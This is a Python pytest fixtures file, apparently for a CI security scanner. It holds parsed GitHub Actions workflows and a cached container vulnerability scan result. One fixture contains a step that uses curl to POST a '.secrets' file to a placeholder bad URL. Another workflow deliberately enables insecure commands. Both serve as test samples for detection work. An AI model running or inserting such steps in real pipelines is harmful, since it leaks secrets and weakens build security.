from __future__ import annotations
from typing import Any

import pytest


@pytest.fixture
def workflow_with_images() -> dict[str, Any]:
    return {
        "name": "Name",
        "on": {
            "workflow_dispatch": {
                "inputs": {
                    "logLevel": {
                        "description": "Log level",
                        "__startline__": 6,
                        "__endline__": 8
                    },
                    "__startline__": 5,
                    "__endline__": 8
                },
                "__startline__": 4,
                "__endline__": 8
            },
            "__startline__": 3,
            "__endline__": 8
        },
        "jobs": {
            "destroy_cert": {
                "runs-on": "ubuntu-latest",
                "name": "Name",
                "container": "node:14.16",
                "steps": [
                    {
                        "name": "Checkout codebase",
                        "uses": "actions/checkout@v3",
                        "__startline__": 14,
                        "__endline__": 16
                    },
                    {
                        "name": "infrastructure",
                        "working-directory": "terraform",
                        "shell": "bash",
                        "env": {
                            "TF_INPUT": 0,
                            "__startline__": 20,
                            "__endline__": 21
                        },
                        "run": "terragrunt init\nterragrunt destroy -auto-approve -var-file devl.tfvars\n",
                        "__startline__": 16,
                        "__endline__": 24
                    }
                ],
                "__startline__": 10,
                "__endline__": 24
            },
            "__startline__": 9,
            "__endline__": 24
        },
        "__startline__": 1,
        "__endline__": 24
    }


@pytest.fixture
def workflow_line_numbers_with_image() -> list[tuple[int, str]]:
    return [(1, 'name: Name\n'),
            (2, 'on:\n'),
            (3, '  workflow_dispatch:\n'),
            (4, '    inputs:\n'),
            (5, '      logLevel:\n'),
            (6, "        description: 'Log level'\n"),
            (7, '\n'),
            (8, 'jobs:\n'),
            (9, '  destroy_cert:\n'),
            (10, '    runs-on: ubuntu-latest\n'),
            (11, '    name: Name\n'),
            (12, '    container: node:14.16\n'),
            (13, '    steps:\n'),
            (14, '      - name: Checkout codebase\n'),
            (15, '        uses: actions/checkout@v3\n'),
            (16, '      - name: infrastructure\n'),
            (17, '        working-directory: terraform\n'),
            (18, '        shell: bash\n'),
            (19, '        env:\n'),
            (20, '          TF_INPUT: 0\n'),
            (21, '        run: |\n'),
            (22, '          terragrunt init\n'),
            (23, '          terragrunt destroy -auto-approve -var-file devl.tfvars\n')]


@pytest.fixture
def workflow_without_images() -> dict[str, Any]:
    return {
        "on": "pull_request",
        "name": "unsecure-worfklow",
        "jobs": {
            "unsecure-job": {
                "name": "job2",
                "runs-on": "ubuntu-latest",
                "env": {
                    "ACTIONS_ALLOW_UNSECURE_COMMANDS": True,
                    "__startline__": 10,
                    "__endline__": 11
                },
                "steps": [
                    {
                        "name": "unsecure-step2",
                        "run": "echo \"goo\"\n",
                        "__startline__": 12,
                        "__endline__": 15
                    }
                ],
                "__startline__": 7,
                "__endline__": 15
            },
            "secure-job": {
                "name": "job3",
                "runs-on": "ubuntu-latest",
                "env": {
                    "ACTIONS_ALLOW_UNSECURE_COMMANDS": False,
                    "__startline__": 19,
                    "__endline__": 20
                },
                "run": "echo \"ok\"",
                "__startline__": 16,
                "__endline__": 21
            },
            "__startline__": 6,
            "__endline__": 21
        },
        "__startline__": 1,
        "__endline__": 21
    }


@pytest.fixture
def workflow_line_numbers_with_image_first() -> list[tuple[int, str]]:
    return [(1, 'name: Name\n'),
            (2, 'on:\n'),
            (3, '  workflow_dispatch:\n'),
            (4, '    inputs:\n'),
            (5, '      logLevel:\n'),
            (6, "        description: 'Log level'\n"),
            (7, '\n'),
            (8, 'jobs:\n'),
            (9, '  first_job:\n'),
            (10, '    container: node:14.22\n'),
            (11, '    name: Name\n'),
            (12, '    book: wood\n'),
            (13, '    steps:\n'),
            (14, '      - name: Checkout codebase\n'),
            (15, '        uses: actions/checkout@v3\n'),
            (16, '      - name: infrastructure\n'),
            (17, '        working-directory: terraform\n'),
            (18, '        shell: bash\n'),
            (19, '        env:\n'),
            (20, '          TF_INPUT: 0\n'),
            (21, '        run: |\n'),
            (22, '          terragrunt init\n'),
            (23, '          terragrunt destroy -auto-approve -var-file devl.tfvars\n'),
            (24, '  second_job:\n'),
            (25, '    runs-on: ubuntu-latest\n'),
            (26, '    name: Name\n'),
            (27, '    container: node:14.16\n'),
            (28, '    steps:\n'),
            (29, '      - name: Checkout codebase\n'),
            (30, '        uses: actions/checkout@v3\n'),
            (31, '      - name: infrastructure\n'),
            (32, '        working-directory: terraform\n'),
            (33, '        shell: bash\n'),
            (34, '        env:\n'),
            (35, '          TF_INPUT: 0\n'),
            (36, '        run: |\n'),
            (37, '          terragrunt init\n'),
            (38, '          terragrunt destroy -auto-approve -var-file devl.tfvars\n')
            ]


@pytest.fixture
def workflow_line_numbers_with_two_identical_images() -> list[tuple[int, str]]:
    return [(1, 'name: Name\n'),
            (2, 'on:\n'),
            (3, '  workflow_dispatch:\n'),
            (4, '    inputs:\n'),
            (5, '      logLevel:\n'),
            (6, "        description: 'Log level'\n"),
            (7, '\n'),
            (8, 'jobs:\n'),
            (9, '  first_job:\n'),
            (10, '    runs-on: ubuntu-latest\n'),
            (11, '    name: Name\n'),
            (12, '    container: node:14.16\n'),
            (13, '    steps:\n'),
            (14, '      - name: Checkout codebase\n'),
            (15, '        uses: actions/checkout@v3\n'),
            (16, '      - name: infrastructure\n'),
            (17, '        working-directory: terraform\n'),
            (18, '        shell: bash\n'),
            (19, '        env:\n'),
            (20, '          TF_INPUT: 0\n'),
            (21, '        run: |\n'),
            (22, '          terragrunt init\n'),
            (23, '          terragrunt destroy -auto-approve -var-file devl.tfvars\n'),
            (24, '  second_job:\n'),
            (25, '    runs-on: ubuntu-latest\n'),
            (26, '    name: Name\n'),
            (27, '    container: node:14.16\n'),
            (28, '    steps:\n'),
            (29, '      - name: Checkout codebase\n'),
            (30, '        uses: actions/checkout@v3\n'),
            (31, '      - name: infrastructure\n'),
            (32, '        working-directory: terraform\n'),
            (33, '        shell: bash\n'),
            (34, '        env:\n'),
            (35, '          TF_INPUT: 0\n'),
            (36, '        run: |\n'),
            (37, '          terragrunt init\n'),
            (38, '          terragrunt destroy -auto-approve -var-file devl.tfvars\n')
            ]


@pytest.fixture
def workflow_with_image_first() -> dict[str, Any]:
    return {
        "name": "Name",
        "on": {
            "workflow_dispatch": {
                "inputs": {
                    "logLevel": {
                        "description": "Log level",
                        "__startline__": 6,
                        "__endline__": 8
                    },
                    "__startline__": 5,
                    "__endline__": 8
                },
                "__startline__": 4,
                "__endline__": 8
            },
            "__startline__": 3,
            "__endline__": 8
        },
        "jobs": {
            "first_job": {
                "runs-on": "ubuntu-latest",
                "name": "Name",
                "container": "node:14.22",
                "steps": [
                    {
                        "name": "Checkout codebase",
                        "uses": "actions/checkout@v3",
                        "__startline__": 14,
                        "__endline__": 16
                    },
                    {
                        "name": "infrastructure",
                        "working-directory": "terraform",
                        "shell": "bash",
                        "env": {
                            "TF_INPUT": 0,
                            "__startline__": 20,
                            "__endline__": 21
                        },
                        "run": "terragrunt init\nterragrunt destroy -auto-approve -var-file devl.tfvars\n",
                        "__startline__": 16,
                        "__endline__": 24
                    }
                ],
                "__startline__": 10,
                "__endline__": 24
            },
            "second_job": {
                "runs-on": "ubuntu-latest",
                "name": "Name",
                "container": "node:14.16",
                "steps": [
                    {
                        "name": "Checkout codebase",
                        "uses": "actions/checkout@v3",
                        "__startline__": 29,
                        "__endline__": 31
                    },
                    {
                        "name": "infrastructure",
                        "working-directory": "terraform",
                        "shell": "bash",
                        "env": {
                            "TF_INPUT": 0,
                            "__startline__": 35,
                            "__endline__": 36
                        },
                        "run": "terragrunt init\nterragrunt destroy -auto-approve -var-file devl.tfvars\n",
                        "__startline__": 31,
                        "__endline__": 39
                    }
                ],
                "__startline__": 25,
                "__endline__": 39
            },
            "__startline__": 24,
            "__endline__": 39
        },
        "__startline__": 1,
        "__endline__": 39
    }


@pytest.fixture
def workflow_with_two_identical_images() -> dict[str, Any]:
    return {
        "name": "Name",
        "on": {
            "workflow_dispatch": {
                "inputs": {
                    "logLevel": {
                        "description": "Log level",
                        "__startline__": 6,
                        "__endline__": 8
                    },
                    "__startline__": 5,
                    "__endline__": 8
                },
                "__startline__": 4,
                "__endline__": 8
            },
            "__startline__": 3,
            "__endline__": 8
        },
        "jobs": {
            "first_job": {
                "runs-on": "ubuntu-latest",
                "name": "Name",
                "container": "node:14.16",
                "steps": [
                    {
                        "name": "Checkout codebase",
                        "uses": "actions/checkout@v3",
                        "__startline__": 14,
                        "__endline__": 16
                    },
                    {
                        "name": "infrastructure",
                        "working-directory": "terraform",
                        "shell": "bash",
                        "env": {
                            "TF_INPUT": 0,
                            "__startline__": 20,
                            "__endline__": 21
                        },
                        "run": "terragrunt init\nterragrunt destroy -auto-approve -var-file devl.tfvars\n",
                        "__startline__": 16,
                        "__endline__": 24
                    }
                ],
                "__startline__": 10,
                "__endline__": 24
            },
            "second_job": {
                "runs-on": "ubuntu-latest",
                "name": "Name",
                "container": "node:14.16",
                "steps": [
                    {
                        "name": "Checkout codebase",
                        "uses": "actions/checkout@v3",
                        "__startline__": 29,
                        "__endline__": 31
                    },
                    {
                        "name": "infrastructure",
                        "working-directory": "terraform",
                        "shell": "bash",
                        "env": {
                            "TF_INPUT": 0,
                            "__startline__": 35,
                            "__endline__": 36
                        },
                        "run": "terragrunt init\nterragrunt destroy -auto-approve -var-file devl.tfvars\n",
                        "__startline__": 31,
                        "__endline__": 39
                    }
                ],
                "__startline__": 25,
                "__endline__": 39
            },
            "__startline__": 24,
            "__endline__": 39
        },
        "__startline__": 1,
        "__endline__": 39
    }


@pytest.fixture
def workflow_line_numbers_without_image() -> list[tuple[int, str]]:
    return [(1, 'on: pull_request\n'),
            (2, '\n'),
            (3, 'name: unsecure-worfklow\n'),
            (4, '\n'),
            (5, 'jobs:\n'),
            (6, '  unsecure-job:\n'),
            (7, '    name: job2\n'),
            (8, '    runs-on: ubuntu-latest\n'),
            (9, '    env:\n'),
            (10, '      ACTIONS_ALLOW_UNSECURE_COMMANDS: true\n'),
            (11, '    steps:\n'),
            (12, '      - name: unsecure-step2\n'),
            (13, '        run: |\n'),
            (14, '          echo "goo"\n'),
            (15, '  secure-job:\n'),
            (16, '    name: job3\n'),
            (17, '    runs-on: ubuntu-latest\n'),
            (18, '    env:\n'),
            (19, '      ACTIONS_ALLOW_UNSECURE_COMMANDS: false\n'),
            (20, '    run: |\n'),
            (21, '      echo "ok"')]


@pytest.fixture
def image_cached_result() -> dict[str, Any]:
    return {
        "results": [
            {
                "id": "sha256:f9b91f78b0344fa0efc5583d79e78a90556ab0bb3f93fcbc8728b0b70d29a5db",
                "name": "python:3.9-alpine",
                "distro": "Alpine Linux v3.16",
                "distroRelease": "3.16.1",
                "digest": "sha256:83a343afa488ff14d0c807b62770140d2ec30ef2e83a3a45c4ce62c29623e240",
                "collections": ["All"],
                "packages": [{"type": "os", "name": "zlib", "version": "1.2.12-r1", "licenses": ["Zlib"]}],
                "compliances": [],
                "complianceDistribution": {"critical": 0, "high": 0, "medium": 0, "low": 0, "total": 0},
                "complianceScanPassed": True,
                "vulnerabilities": [
                    {
                        "id": "CVE-2022-37434",
                        "status": "fixed in 1.2.12-r2",
                        "description": "zlib through 1.2.12 has a heap-based buffer over-read ...",
                        "severity": "low",
                        "packageName": "zlib",
                        "packageVersion": "1.2.12-r1",
                        "link": "https://nvd.nist.gov/vuln/detail/CVE-2022-37434",
                        "riskFactors": ["Has fix", "Recent vulnerability"],
                        "impactedVersions": ["<1.2.12-r2"],
                        "publishedDate": "2022-08-05T07:15:00Z",
                        "discoveredDate": "2022-08-08T13:45:43Z",
                        "fixDate": "2022-08-05T07:15:00Z",
                    }
                ],
                "vulnerabilityDistribution": {"critical": 0, "high": 0, "medium": 0, "low": 1, "total": 1},
                "vulnerabilityScanPassed": True,
            }
        ]
    }


@pytest.fixture
def definition() -> dict[str, Any]:
    return {
        "name": "CI",
        "on": {
            "push": {
                "branches": [
                    "main"
                ],
                "__startline__": 4,
                "__endline__": 5
            },
            "__startline__": 3,
            "__endline__": 5
        },
        "jobs": {
            "container-test-job": {
                "runs-on": "ubuntu-latest",
                "container": {
                    "image": "node:14.16",
                    "env": {
                        "NODE_ENV": "development",
                        "__startline__": 11,
                        "__endline__": 12
                    },
                    "ports": [
                        80
                    ],
                    "volumes": [
                        "my_docker_volume:/volume_mount"
                    ],
                    "options": "--cpus 1",
                    "__startline__": 9,
                    "__endline__": 17
                },
                "steps": [
                    {
                        "name": "Check for dockerenv file",
                        "run": "(ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)\ncurl -X POST -s --data \"@.secrets\" <BADURL > /dev/null\n",
                        "__startline__": 18,
                        "__endline__": 23
                    }
                ],
                "__startline__": 7,
                "__endline__": 23
            },
            "second_job": {
                "runs-on": "ubuntu-latest",
                "steps": [
                    {
                        "name": "Check for dockerenv file",
                        "run": "(ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)\ncurl -X POST -s --data \"@.secrets\" <BADURL > /dev/null\n",
                        "__startline__": 26,
                        "__endline__": 30
                    }
                ],
                "__startline__": 24,
                "__endline__": 30
            },
            "__startline__": 6,
            "__endline__": 30
        },
        "__startline__": 1,
        "__endline__": 30
    }